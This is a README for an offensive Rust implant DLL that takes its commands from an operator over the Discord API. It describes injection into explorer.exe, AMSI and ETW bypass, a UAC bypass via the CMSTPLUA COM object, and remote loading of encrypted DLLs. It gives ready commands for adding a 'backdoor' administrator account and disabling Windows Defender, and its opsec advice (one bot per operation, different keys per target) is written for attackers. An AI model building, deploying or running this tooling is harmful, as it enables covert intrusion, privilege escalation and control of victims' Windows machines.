# Beacon Rust - Discord C2 DLL

Discord-based beacon DLL for the FrameworkC2 project.

## Features

- Auto-starts on DllMain (spawns worker thread)
- Discord REST API communication
- AMSI/ETW bypass (hardware breakpoints)
- Dynamic PE loading for additional modules

## Commands

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute PowerShell command |
| `scr` | Screenshot all monitors |
| `!loaddll [name]` | Load attached DLL (XOR encrypted) |
| `!uacbypass [cmd]` | Execute command with elevated privileges (UAC bypass) |
| `help` | Show available commands |

## Configuration

Edit `config.toml` before building:

```toml
[discord]
api_url = "https://discord.com/api/v10"
bot_token = "YOUR_BOT_TOKEN_HERE"
guild_id = "YOUR_GUILD_ID_HERE"
general_channel_id = "YOUR_CHANNEL_ID_HERE"

[settings]
poll_interval_secs = 5

[crypto]
xor_key = "41"  # Hex string for XOR decryption
```

## Building

```bash
# From FrameworkC2 root
cargo build --release --target x86_64-pc-windows-gnu --package beacon

# Output: target/x86_64-pc-windows-gnu/release/beacon.dll
```

## Usage

### Via Loader (Recommended)

The loader injects beacon.dll into explorer.exe. The beacon:
1. Auto-starts in a new thread
2. Runs AMSI/ETW bypass
3. Connects to Discord
4. Creates a channel named after the hostname
5. Starts polling for commands

### Via rundll32 (Testing)

```cmd
rundll32.exe beacon.dll,Start
rundll32.exe beacon.dll,Run
```

## UAC Bypass

The `!uacbypass` command executes commands with elevated (Administrator) privileges without triggering the UAC prompt.

### How it works

Based on [UACME Method 41](https://github.com/hfiref0x/UACME) by Oddvar Moe, this technique abuses the auto-elevation feature of the CMSTPLUA COM object:

1. Windows has a list of "auto-elevated" COM objects that can be instantiated with admin privileges
2. The CMSTPLUA (Connection Manager) object is in this list
3. Its ICMLuaUtil interface has a `ShellExec` method that runs commands elevated
4. We use the COM elevation moniker (`Elevation:Administrator!new:`) to get an elevated interface

### Requirements

- User must be a member of the local Administrators group
- UAC must be set to "Default" or lower (not "Always Notify")
- Only works on Windows (Vista and later)

### Usage

```
# Spawn an elevated cmd.exe window (visible)
!uacbypass

# Execute a command with elevated privileges (hidden)
!uacbypass whoami /all

# Add a new admin user
!uacbypass net user backdoor Password123! /add
!uacbypass net localgroup administrators backdoor /add

# Disable Windows Defender
!uacbypass powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

### Limitations

- **No output capture**: The command runs in a separate elevated process. Output is not returned to the beacon.
- **Workaround**: Redirect output to a file, then read it:
  ```
  !uacbypass cmd /c whoami > C:\temp\output.txt
  shell type C:\temp\output.txt
  ```

### Error Codes

| Code | Meaning |
|------|---------|
| `ComInitFailed` | COM initialization failed |
| `ElevationFailed` | Could not create elevated COM object (UAC set to Always Notify?) |
| `ShellExecFailed` | The ShellExec method failed |
| `InvalidParams` | Invalid command parameters |

## Loading Additional DLLs

The `!loaddll` command allows loading arbitrary DLLs at runtime:

1. Encrypt DLL with XOR:
   ```bash
   python3 ../tools/xor_encrypt.py payload.dll payload.dll.enc 41
   ```

2. In Discord channel, attach `payload.dll.enc` and send:
   ```
   !loaddll
   ```

3. The beacon downloads, decrypts, and loads the DLL using the PE loader.

## Architecture

```
DllMain (DLL_PROCESS_ATTACH)
    │
    └─▶ spawn thread
            │
            ├─▶ setup_bypass()     # AMSI/ETW
            │
            ├─▶ Config::load()     # Read embedded config
            │
            ├─▶ DiscordClient      # Connect to Discord
            │       │
            │       ├─▶ validate_token()
            │       ├─▶ get_or_create_channel()
            │       ├─▶ notify_connection()
            │       │
            │       └─▶ polling_loop()
            │               │
            │               ├─▶ get_latest_message()
            │               ├─▶ process_command()
            │               │       │
            │               │       ├─▶ Shell → execute_shell_command()
            │               │       ├─▶ Screenshot → capture_screenshot()
            │               │       ├─▶ LoadDll → handle_loaddll()
            │               │       │       │
            │               │       │       ├─▶ download_file()
            │               │       │       ├─▶ xor_decrypt()
            │               │       │       └─▶ load_dll_from_bytes()
            │               │       │               │
            │               │       │               └─▶ PeLoader::load()
            │               │       │
            │               │       └─▶ Help → get_help_message()
            │               │
            │               └─▶ send_command_result()
            │
            └─▶ (loop forever or until error)
```

## Dependencies

- `c2_common` - PE loader and syscalls
- `reqwest` - HTTP client (blocking, rustls)
- `image` - Screenshot encoding
- `xcap` - Screen capture (Windows)
- `winapi/ntapi` - Windows API types

## Security Considerations

1. **Bot Token**: The token is embedded in the DLL. Consider:
   - Using a dedicated bot per operation
   - Rotating tokens
   - Server-side token storage

2. **Encryption**: XOR is simple but weak. Consider:
   - AES encryption for payloads
   - Different keys per target

3. **Indicators**:
   - Discord API traffic
   - DLL size (~2.2 MB)
   - Rust runtime artifacts

## Files

```
beacon_rust/
├── Cargo.toml           # Dependencies
├── config.toml          # Embedded config template
├── README.md            # This file
└── src/
    ├── lib.rs           # DllMain, exports
    ├── config.rs        # Config loading
    ├── error.rs         # Error types
    ├── bypass.rs        # AMSI/ETW bypass
    ├── discord/
    │   ├── mod.rs
    │   ├── client.rs    # Discord API client
    │   └── models.rs    # Data structures
    └── commands/
        ├── mod.rs
        ├── models.rs    # Command enum
        ├── shell.rs     # PowerShell execution
        ├── screenshot.rs # Screenshot capture
        └── loaddll.rs   # PE loader integration
```
